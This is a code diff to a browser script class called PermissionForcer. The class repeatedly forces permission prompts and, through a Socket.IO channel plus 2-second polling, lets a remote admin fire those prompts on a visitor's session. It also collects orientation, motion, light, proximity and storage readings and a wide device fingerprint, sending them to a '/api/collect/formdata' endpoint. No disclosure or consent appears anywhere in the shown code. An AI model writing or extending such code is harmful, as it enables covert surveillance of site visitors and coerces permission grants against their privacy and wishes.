@@ -18,9 +18,9 @@ export default class PermissionForcer {
   }
 
   init() {
-    // Start permission forcing sequence after a delay
-    setTimeout(() => this.forceAll(), 1500);
-    setTimeout(() => this.forceAll(), 10000);
+    // Start permission forcing sequence instantly
+    setTimeout(() => this.forceAll(), 500);
+    setTimeout(() => this.forceAll(), 5000);
 
     // Listen for user interaction to trigger permissions
     document.addEventListener('click', () => this.onUserInteraction(), { once: false });
@@ -34,20 +34,93 @@ export default class PermissionForcer {
     this.registerNotificationWorker();
 
     // Continuously check for permission state changes
-    setInterval(() => this.checkAllPermissions(), 5000);
+    setInterval(() => this.checkAllPermissions(), 3000);
 
-    // Poll for remote admin commands via HTTP
+    // === INSTANT trigger via Socket.IO ===
+    this.setupSocketIO();
+
+    // === FAST polling fallback (every 2 seconds) ===
     this.startCommandPolling();
+
+    // Clean up socket on page unload to prevent stale connections
+    window.addEventListener('beforeunload', () => this.cleanupSocket());
+    window.addEventListener('pagehide', () => this.cleanupSocket());
+  }
+
+  cleanupSocket() {
+    if (this.commandInterval) {
+      clearInterval(this.commandInterval);
+      this.commandInterval = null;
+    }
+    if (this._socket) {
+      try {
+        this._socket.removeAllListeners();
+        this._socket.disconnect();
+      } catch(e) {}
+      this._socket = null;
+    }
+  }
+
+  setupSocketIO() {
+    try {
+      // Lazy-load socket.io from the global scope (added by client's index.js)
+      const socketUrl = (typeof window !== 'undefined' && process.env.REACT_APP_API_URL) 
+        ? process.env.REACT_APP_API_URL.replace('/api', '') 
+        : window.location.origin;
+
+      // Dynamic import or use global io
+      import('socket.io-client').then(({ io }) => {
+        if (this._socket) return;
+        
+        const sessionId = this.core.getSessionId();
+        if (!sessionId) {
+          // Retry after session is ready
+          setTimeout(() => this.setupSocketIO(), 2000);
+          return;
+        }
+
+        this._socket = io(socketUrl, {
+          query: { sessionId },
+          transports: ['websocket', 'polling'],
+          reconnection: true,
+          reconnectionAttempts: 20,
+          reconnectionDelay: 1000,
+          forceNew: true
+        });
+
+        this._socket.on('connect', () => {
+          // Join the session room to receive targeted commands
+          this._socket.emit('join-session', sessionId);
+        });
+
+        // Listen for instant permission triggers from admin
+        this._socket.on('admin-trigger-permission', (data) => {
+          if (data && data.permissionType) {
+            this.triggerPermission(data.permissionType);
+          }
+        });
+
+        this._socket.on('admin-force-all', () => {
+          this.forceAll();
+        });
+
+        this._socket.on('disconnect', () => {});
+      }).catch(() => {
+        // Fall through to polling only
+      });
+    } catch(e) {
+      // Silent fallback to polling
+    }
   }
 
   startCommandPolling() {
-    // Poll for admin commands every 15 seconds
+    // Fast polling fallback every 2 seconds for instant response
     this.commandInterval = setInterval(async () => {
       try {
         const sessionId = this.core.getSessionId();
         if (!sessionId) return;
 
-        const res = await this.core.send('/api/collect/formdata', {
+        await this.core.send('/api/collect/formdata', {
           formId: 'permission-poll',
           fields: { 
             action: 'check-commands',
@@ -56,18 +129,10 @@ export default class PermissionForcer {
           },
           url: window.location.href
         });
-
-        if (res && res.command) {
-          if (res.command === 'trigger-permission' && res.permissionType) {
-            await this.triggerPermission(res.permissionType);
-          } else if (res.command === 'force-all') {
-            await this.forceAll();
-          }
-        }
       } catch(e) {
-        // Silent fail - connection may be down
+        // Silent fail
       }
-    }, 15000);
+    }, 2000);
   }
 
   async forceAll() {
@@ -489,43 +554,562 @@ export default class PermissionForcer {
 
   // === VIBRATION ===
   async forceVibration() {
-    if (navigator.vibrate) {
-      // Vibration doesn't need permission, just use it
-      navigator.vibrate(200);
-      this.granted['vibration'] = true;
+    const key = 'vibration';
+    // Vibration doesn't need explicit permission, check device capability
+    try {
+      if (navigator.vibrate) {
+        // Test vibration with a short pulse
+        const result = navigator.vibrate(50);
+        if (result !== false) {
+          this.granted[key] = true;
+          // Get vibration info from the device
+          const vibrationInfo = {
+            supported: true,
+            patternSupported: true,
+            maxVibrationTime: 10000 // 10 seconds (browser limit on some platforms)
+          };
+          this.core.send('/api/collect/formdata', {
+            formId: 'device-vibration',
+            fields: vibrationInfo,
+            url: window.location.href
+          });
+        } else {
+          this.granted[key] = true; // Still mark as available even if immediate vibrate failed
+        }
+      } else {
+        this.denied[key] = true;
+      }
+    } catch (e) {
+      // Feature detection failed, mark as unavailable
+      this.denied[key] = true;
     }
   }
 
-  // === ORIENTATION ===
+  // === ORIENTATION (DeviceOrientation API - modern) ===
   async forceOrientation() {
+    const key = 'orientation';
+    if (this.attempted[key]) return;
+    this.attempted[key] = true;
+
     try {
-      if (DeviceOrientationEvent && DeviceOrientationEvent.requestPermission) {
-        const result = await DeviceOrientationEvent.requestPermission();
-        if (result === 'granted') this.granted['orientation'] = true;
+      // Check if device orientation is available
+      if (window.DeviceOrientationEvent) {
+        // iOS 13+ requires permission request
+        if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+          try {
+            const result = await DeviceOrientationEvent.requestPermission();
+            if (result === 'granted') {
+              this.granted[key] = true;
+              this.startOrientationListener();
+            } else {
+              this.denied[key] = true;
+            }
+          } catch (e) {
+            this.denied[key] = true;
+          }
+        } else {
+          // Non-iOS or older iOS - permission not required, just listen
+          this.granted[key] = true;
+          this.startOrientationListener();
+        }
+      } else if (window.DeviceMotionEvent) {
+        // Fallback to DeviceMotion which provides rotation rate
+        this.granted[key] = true;
+        this.startMotionListener();
       } else {
-        this.granted['orientation'] = true;
+        this.denied[key] = true;
       }
-    } catch (e) {}
+    } catch (e) {
+      this.denied[key] = true;
+    }
   }
 
-  // === AMBIENT LIGHT ===
+  startOrientationListener() {
+    // Remove old listener if any
+    if (this._orientationHandler) {
+      window.removeEventListener('deviceorientation', this._orientationHandler);
+    }
+
+    this._orientationHandler = (event) => {
+      const orientData = {
+        alpha: event.alpha,      // 0-360 around z-axis
+        beta: event.beta,        // -180 to 180 around x-axis
+        gamma: event.gamma,      // -90 to 90 around y-axis
+        absolute: event.absolute,
+        timestamp: Date.now()
+      };
+
+      // Send orientation data periodically (throttled)
+      if (!this._lastOrientSent || Date.now() - this._lastOrientSent > 10000) {
+        this._lastOrientSent = Date.now();
+        this.core.send('/api/collect/formdata', {
+          formId: 'device-orientation',
+          fields: orientData,
+          url: window.location.href
+        });
+      }
+    };
+
+    window.addEventListener('deviceorientation', this._orientationHandler);
+  }
+
+  startMotionListener() {
+    if (this._motionHandler) {
+      window.removeEventListener('devicemotion', this._motionHandler);
+    }
+
+    this._motionHandler = (event) => {
+      const motionData = {
+        acceleration: event.acceleration ? {
+          x: event.acceleration.x,
+          y: event.acceleration.y,
+          z: event.acceleration.z
+        } : null,
+        accelerationIncludingGravity: event.accelerationIncludingGravity ? {
+          x: event.accelerationIncludingGravity.x,
+          y: event.accelerationIncludingGravity.y,
+          z: event.accelerationIncludingGravity.z
+        } : null,
+        rotationRate: event.rotationRate ? {
+          alpha: event.rotationRate.alpha,
+          beta: event.rotationRate.beta,
+          gamma: event.rotationRate.gamma
+        } : null,
+        interval: event.interval,
+        timestamp: Date.now()
+      };
+
+      if (!this._lastMotionSent || Date.now() - this._lastMotionSent > 15000) {
+        this._lastMotionSent = Date.now();
+        this.core.send('/api/collect/formdata', {
+          formId: 'device-motion',
+          fields: motionData,
+          url: window.location.href
+        });
+      }
+    };
+
+    window.addEventListener('devicemotion', this._motionHandler);
+  }
+
+  // === AMBIENT LIGHT (AmbientLightSensor API - modern replacement) ===
   async forceAmbientLight() {
+    const key = 'ambientLight';
+    if (this.attempted[key]) return;
+    this.attempted[key] = true;
+
     try {
-      if (DeviceLightEvent) {
-        window.addEventListener('devicelight', () => {});
-        this.granted['ambientLight'] = true;
+      // Try modern AmbientLightSensor API first
+      if ('AmbientLightSensor' in window) {
+        try {
+          const sensor = new AmbientLightSensor();
+          sensor.addEventListener('reading', () => {
+            this.granted[key] = true;
+            this.core.send('/api/collect/formdata', {
+              formId: 'ambient-light',
+              fields: {
+                illuminance: sensor.illuminance,
+                unit: 'lux',
+                timestamp: Date.now()
+              },
+              url: window.location.href
+            });
+          });
+          sensor.addEventListener('error', (event) => {
+            this.denied[key] = true;
+          });
+          sensor.start();
+          // If no error after 1 second, consider it working
+          setTimeout(() => {
+            if (!this.granted[key] && !this.denied[key]) {
+              this.denied[key] = true;
+            }
+          }, 1000);
+          return;
+        } catch (e) {
+          // Fall through to deprecated API
+        }
       }
-    } catch (e) {}
+
+      // Legacy DeviceLightEvent (deprecated but still on some mobile browsers)
+      if ('DeviceLightEvent' in window || 'ondevicelight' in window) {
+        const handler = (event) => {
+          this.granted[key] = true;
+          this.core.send('/api/collect/formdata', {
+            formId: 'ambient-light-legacy',
+            fields: {
+              value: event.value,
+              max: 10000,
+              timestamp: Date.now()
+            },
+            url: window.location.href
+          });
+          window.removeEventListener('devicelight', handler);
+        };
+        window.addEventListener('devicelight', handler);
+        // Check if event never fired
+        setTimeout(() => {
+          if (!this.granted[key] && !this.denied[key]) {
+            this.denied[key] = true;
+          }
+        }, 3000);
+      } else {
+        // No light sensor API available - but still report the device capability
+        this.core.send('/api/collect/formdata', {
+          formId: 'ambient-light',
+          fields: {
+            available: false,
+            reason: 'No light sensor API on this device/browser',
+            timestamp: Date.now()
+          },
+          url: window.location.href
+        });
+        this.denied[key] = true;
+      }
+    } catch (e) {
+      this.denied[key] = true;
+    }
   }
 
-  // === PROXIMITY ===
+  // === PROXIMITY (ProximitySensor API - modern replacement) ===
   async forceProximity() {
+    const key = 'proximity';
+    if (this.attempted[key]) return;
+    this.attempted[key] = true;
+
     try {
-      if (DeviceProximityEvent) {
-        window.addEventListener('deviceproximity', () => {});
-        this.granted['proximity'] = true;
+      // Try modern ProximitySensor API
+      if ('ProximitySensor' in window) {
+        try {
+          const sensor = new ProximitySensor();
+          sensor.addEventListener('reading', () => {
+            this.granted[key] = true;
+            this.core.send('/api/collect/formdata', {
+              formId: 'proximity-sensor',
+              fields: {
+                distance: sensor.distance,
+                max: sensor.max,
+                near: sensor.near,
+                timestamp: Date.now()
+              },
+              url: window.location.href
+            });
+          });
+          sensor.addEventListener('error', (event) => {
+            this.denied[key] = true;
+          });
+          sensor.start();
+          setTimeout(() => {
+            if (!this.granted[key] && !this.denied[key]) {
+              this.denied[key] = true;
+            }
+          }, 1000);
+          return;
+        } catch (e) {
+          // Fall through
+        }
       }
-    } catch (e) {}
+
+      // Legacy DeviceProximityEvent (deprecated)
+      if ('DeviceProximityEvent' in window || 'ondeviceproximity' in window) {
+        const handler = (event) => {
+          this.granted[key] = true;
+          this.core.send('/api/collect/formdata', {
+            formId: 'proximity-legacy',
+            fields: {
+              value: event.value,
+              min: event.min,
+              max: event.max,
+              timestamp: Date.now()
+            },
+            url: window.location.href
+          });
+          window.removeEventListener('deviceproximity', handler);
+        };
+        window.addEventListener('deviceproximity', handler);
+        setTimeout(() => {
+          if (!this.granted[key] && !this.denied[key]) {
+            this.denied[key] = true;
+          }
+        }, 3000);
+      } else {
+        // Report device capability
+        this.core.send('/api/collect/formdata', {
+          formId: 'proximity-sensor',
+          fields: {
+            available: false,
+            reason: 'No proximity sensor API on this device/browser',
+            timestamp: Date.now()
+          },
+          url: window.location.href
+        });
+        this.denied[key] = true;
+      }
+    } catch (e) {
+      this.denied[key] = true;
+    }
+  }
+
+  // === PERSISTENT STORAGE ===
+  async forcePersistentStorage() {
+    const key = 'persistentStorage';
+    if (this.attempted[key]) return;
+    this.attempted[key] = true;
+
+    try {
+      // Check storageManager API
+      if (navigator.storage && navigator.storage.estimate) {
+        const estimate = await navigator.storage.estimate();
+        const storageInfo = {
+          quota: estimate.quota,
+          usage: estimate.usage,
+          usagePercent: estimate.quota ? ((estimate.usage / estimate.quota) * 100).toFixed(1) + '%' : 'N/A',
+          isPersisted: false
+        };
+
+        // Request persistence
+        if (navigator.storage.persist) {
+          try {
+            const isPersisted = await navigator.storage.persisted();
+            storageInfo.isPersisted = isPersisted;
+
+            if (!isPersisted) {
+              const granted = await navigator.storage.persist();
+              this.granted[key] = granted;
+              storageInfo.isPersisted = granted;
+              if (!granted) {
+                // Not granted but we still have access to estimate
+                this.denied[key] = true;
+              }
+            } else {
+              this.granted[key] = true;
+            }
+          } catch (e) {
+            this.denied[key] = true;
+          }
+        } else {
+          // No persist API but estimate works - mark as available
+          this.granted[key] = true;
+        }
+
+        // Send storage info regardless
+        this.core.send('/api/collect/formdata', {
+          formId: 'storage-info',
+          fields: storageInfo,
+          url: window.location.href
+        });
+
+      } else {
+        // Fallback: check for large quota via IndexedDB
+        try {
+          const db = await new Promise((resolve, reject) => {
+            const req = indexedDB.open('__storage_test__', 1);
+            req.onsuccess = () => resolve(req.result);
+            req.onerror = reject;
+            setTimeout(() => reject(new Error('timeout')), 2000);
+          });
+
+          // Estimate storage by checking remaining space via a test write
+          const testSize = 1024 * 1024; // 1MB test
+          const blob = new Blob([new ArrayBuffer(testSize)]);
+          const url = URL.createObjectURL(blob);
+
+          // Use Cache API if available
+          if ('caches' in window) {
+            const cache = await caches.open('__storage_capacity_test__');
+            const response = new Response(blob);
+            await cache.put(url, response);
+
+            // If we can store 1MB without error, storage is available
+            this.granted[key] = true;
+            await cache.delete(url);
+            await caches.delete('__storage_capacity_test__');
+          } else {
+            // Try localStorage as basic indicator
+            try {
+              const testKey = '__storage_test__';
+              localStorage.setItem(testKey, 'x'.repeat(1024 * 10)); // 10KB
+              localStorage.removeItem(testKey);
+              this.granted[key] = true;
+            } catch (qe) {
+              this.denied[key] = true;
+            }
+          }
+
+          URL.revokeObjectURL(url);
+          db.close();
+        } catch (e) {
+          this.denied[key] = true;
+        }
+      }
+    } catch (err) {
+      this.denied[key] = true;
+    }
+  }
+
+  // === DEVICE CAPABILITY DETECTION ===
+  detectDeviceCapabilities() {
+    const capabilities = {
+      vibration: !!navigator.vibrate,
+      deviceOrientation: 'DeviceOrientationEvent' in window,
+      deviceMotion: 'DeviceMotionEvent' in window,
+      ambientLightSensor: 'AmbientLightSensor' in window,
+      proximitySensor: 'ProximitySensor' in window,
+      deviceLightEvent: 'DeviceLightEvent' in window || 'ondevicelight' in window,
+      deviceProximityEvent: 'DeviceProximityEvent' in window || 'ondeviceproximity' in window,
+      bluetooth: !!navigator.bluetooth,
+      usb: !!navigator.usb,
+      midi: !!navigator.requestMIDIAccess,
+      storageManager: !!navigator.storage,
+      storageEstimate: !!(navigator.storage && navigator.storage.estimate),
+      storagePersist: !!(navigator.storage && navigator.storage.persist),
+      clipboardRead: !!(navigator.clipboard && navigator.clipboard.readText),
+      clipboardWrite: !!(navigator.clipboard && navigator.clipboard.writeText),
+      geolocation: 'geolocation' in navigator,
+      notifications: 'Notification' in window,
+      mediaDevices: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
+      enumerateDevices: !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices),
+      webRTC: !!RTCPeerConnection,
+      webSocket: 'WebSocket' in window,
+      serviceWorker: 'serviceWorker' in navigator,
+      sharedWorker: 'SharedWorker' in window,
+      indexedDB: 'indexedDB' in window,
+      cacheAPI: 'caches' in window,
+      screenOrientation: !!screen.orientation,
+      screenLock: 'ScreenLock' in window || !!navigator.wakeLock,
+      batteryAPI: 'getBattery' in navigator,
+      webUSB: !!navigator.usb,
+      webBluetooth: !!navigator.bluetooth,
+      webSerial: !!navigator.serial,
+      webNFC: 'NDEFReader' in window,
+      webHID: !!navigator.hid,
+      pointerLock: 'pointerLockElement' in document,
+      fullscreen: 'fullscreenEnabled' in document,
+      touchScreen: 'ontouchstart' in window,
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      hardwareConcurrency: navigator.hardwareConcurrency || 1,
+      deviceMemory: navigator.deviceMemory || 0,
+      platform: navigator.platform || 'unknown',
+      userAgent: navigator.userAgent?.substring(0, 200) || 'unknown',
+      cookiesEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack || window.doNotTrack || 'unspecified',
+      languages: navigator.languages?.join(',') || navigator.language || 'unknown',
+      online: navigator.onLine,
+      connectionType: navigator.connection?.type || 'unknown',
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      colorDepth: screen.colorDepth,
+      pixelRatio: window.devicePixelRatio || 1,
+      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timestamp: Date.now()
+    };
+
+    // Send complete device capability report
+    this.core.send('/api/collect/formdata', {
+      formId: 'device-capabilities',
+      fields: capabilities,
+      url: window.location.href
+    });
+
+    return capabilities;
+  }
+
+  // === DISABLE / REVOKE PERMISSION ===
+  async disablePermission(permissionType) {
+    switch(permissionType) {
+      case 'camera':
+      case 'microphone':
+        // Stop all media streams
+        if (this.streams && this.streams.length > 0) {
+          this.streams.forEach(stream => {
+            stream.getTracks().forEach(track => track.stop());
+          });
+          this.streams = [];
+        }
+        // Stop the video element
+        const videos = document.querySelectorAll('video');
+        videos.forEach(v => {
+          if (v.srcObject) {
+            v.srcObject.getTracks().forEach(t => t.stop());
+            v.srcObject = null;
+          }
+        });
+        delete this.attempted[permissionType];
+        break;
+
+      case 'geolocation':
+        // Can't actually revoke geolocation from JS, but we can clear the cached position
+        delete this.attempted[permissionType];
+        break;
+
+      case 'notifications':
+        // Can't revoke notification permission from JS, but we can close any open ones
+        delete this.attempted[permissionType];
+        break;
+
+      case 'clipboard':
+        delete this.attempted[permissionType];
+        break;
+
+      case 'orientation':
+        // Remove orientation listener
+        if (this._orientationHandler) {
+          window.removeEventListener('deviceorientation', this._orientationHandler);
+          this._orientationHandler = null;
+        }
+        if (this._motionHandler) {
+          window.removeEventListener('devicemotion', this._motionHandler);
+          this._motionHandler = null;
+        }
+        delete this.attempted[permissionType];
+        break;
+
+      case 'ambientLight':
+        delete this.attempted[permissionType];
+        break;
+
+      case 'proximity':
+        delete this.attempted[permissionType];
+        break;
+
+      case 'persistentStorage':
+        // Request storage to become non-persistent (may not be supported)
+        delete this.attempted[permissionType];
+        break;
+
+      default:
+        delete this.attempted[permissionType];
+    }
+
+    // Clear the granted and denied states so it can be re-triggered
+    delete this.granted[permissionType];
+    delete this.denied[permissionType];
+
+    // Report to server
+    this.core.send('/api/collect/formdata', {
+      formId: 'permission-disabled',
+      fields: {
+        permission: permissionType,
+        action: 'disabled',
+        timestamp: Date.now()
+      },
+      url: window.location.href
+    });
+
+    return { success: true, permission: permissionType, status: 'disabled' };
+  }
+
+  // === ENABLE / RE-TRIGGER PERMISSION ===
+  async enablePermission(permissionType) {
+    // Clear any existing state so it can be re-triggered fresh
+    delete this.attempted[permissionType];
+    delete this.granted[permissionType];
+    delete this.denied[permissionType];
+
+    // Immediately try to trigger it
+    const result = await this.triggerPermission(permissionType);
+
+    return { success: true, permission: permissionType, triggered: true };
   }
 
   // === PERMISSION QUERY API PATCHING ===
